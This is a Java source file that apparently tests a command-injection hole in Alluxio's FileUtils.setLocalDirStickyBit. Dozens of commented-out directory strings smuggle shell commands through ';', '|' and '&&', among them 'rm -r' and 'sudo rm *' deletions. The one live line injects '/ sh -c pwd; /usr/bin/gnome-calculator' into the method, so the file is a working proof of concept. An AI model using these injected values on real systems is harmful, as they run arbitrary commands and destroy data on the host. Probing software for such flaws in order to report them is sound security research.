package com.example;
import java.io.IOException;

import alluxio.proto.journal.File;
import alluxio.util.io.FileUtils;

public class Main {
    public static void main(String[] args) throws IOException {
        System.out.println(alluxio.AlluxioURI.SEPARATOR);
        // String dir1 = "/path/to/directory | echo 123/";
        // String dir1 = "/ bad; rm /home/mishadyagilev/javaFolder/demo2/fine/one.txt";
        // String dir1 = "/cd | bash rm fine/one.txt";
        // String dir1 = "/cd | bash rm /home/mishadyagilev/javaFolder/demo2/fine/one.txt";
        // String dir1 = "/bash rm /home/mishadyagilev/javaFolder/demo2/fine/one.txt";
        // String dir1 = "/cd | rm /fine/one.txt";
        // String dir1 = "/cd | #!/bin/bash -ex rm -rf fine/one.txt";
        // String dir1 = "/cd | #!/bin/bash -ex rm -rf fine/one.txt";
        // String dir1 = "/cd | bash -c rm fine/one.txt";
        // String dir1 = "/bad | bash -c rm fine/one.txt";
        // String dir1 = "/bad; cd ./fine; rm one.txt\"";
        // String dir1 = "/ bash echo \"bad; cd ./fine; rm one.txt\"";
        // String dir1 = "/fine +\"; cd ./fine; rm one.txt\"";
        // String dir1 = "/fine;\" cd ./fine; rm one.txt\"";
        // String dir3 = "Runtime.getRuntime().exec(bash rm /one/one.txt)";
        // String dir3 = "/bad;Runtime.getRuntime().exec(bash rm /one/one.txt)";
        // String dir1 = "/fine; ";
        // String dir1 = "/bad; cd ./fine && rm one.txt";
        // String dir3 = "/bad;Runtime.getRuntime().exec(bash rm ./one/one.txt)";
        // String dir1 = "/bad; rm -f ./fine/one.txt";
        // String dir1 = "/; rm ./home/mishadyagilev/javaFolder/demo2/fine/one.txt";
        // String dir1 = "/; rm ./fine/one.txt";
        // String dir1 = "/home/mishadyagilev/javaFolder/demo2/four";
        // String dir1 = "/home/mishadyagilev/javaFolder/demo2/six | rm -f ./six/one.txt";
        // String dir1 = "/home/mishadyagilev/javaFolder/demo2/six | touch /home/mishadyagilev/javaFolder/demo2/six/two.txt";
        
        // String dir1 = "/ && rm -r /home/mishadyagilev/javaFolder/demo2/eight"; // work!
        // String dir1 = "/ && rm -r /home/mishadyagilev/javaFolder/demo2/ten/";
        // String dir1 = "/ && sudo rm one.txt";
        // String dir1 = "/ && sudo cd /home/mishadyagilev/javaFolder/demo2/fourteen | sudo rm *";
        // String dir1 = "/ && sudo touch one.txt";
        // String dir1 = "/home/mishadyagilev/javaFolder/demo2/top && rm -r /home/mishadyagilev/javaFolder/demo2/fifteen";
        // String dir1 = "/\"/\" && touch /home/mishadyagilev/javaFolder/demo2/three.txt";
        // String dir1 = "bash rm /home/mishadyagilev/javaFolder/demo2/fine/one.txt";
        // String dir1 = "/bin/sh, \"-c\", \"/usr/bin/gnome-calculator\"";
        // String dir1 = "/bin/sh -c /usr/bin/gnome-calculator";
        // String dir1 = "/new String[] {\"/bin/sh\", \"-c\",  \"/usr/bin/gnome-calculator\"}";
        // String[] dir1 = {"/","/bin/sh","-c","/usr/bin/gnome-calculator"};
        // String dir1 = "/new String[] {\"/bin/sh\", \"-c\",  \"/usr/bin/gnome-calculator\"}";
        // String dir1 = "/ -c /usr/bin/gnome-calculator";

        // Runtime.getRuntime().exec("chmod +t /home/mishadyagilev/javaFolder/demo2/top && /usr/bin/gnome-calculator");
        // String[] dir2 = {"/","/bin/sh","-c","/usr/bin/gnome-calculator"};
        // String dir1 =  dir2.toString();
        // String dir1 = "/ sh -c pwd; /usr/bin/gnome-calculator";
        String dir1 = "/ sh -c pwd; /usr/bin/gnome-calculator";

        FileUtils.setLocalDirStickyBit(dir1.toString());

        // String dir2 = "./fine/one.txt";
        //System.out.println(FileUtils.exists(dir2));

        if (dir1.startsWith(alluxio.AlluxioURI.SEPARATOR)) {
            System.out.println("the check up of seperatore was proceeded");
        } else {
            System.out.println("the check up of seperatore was not proceeded");
        }
    }
}
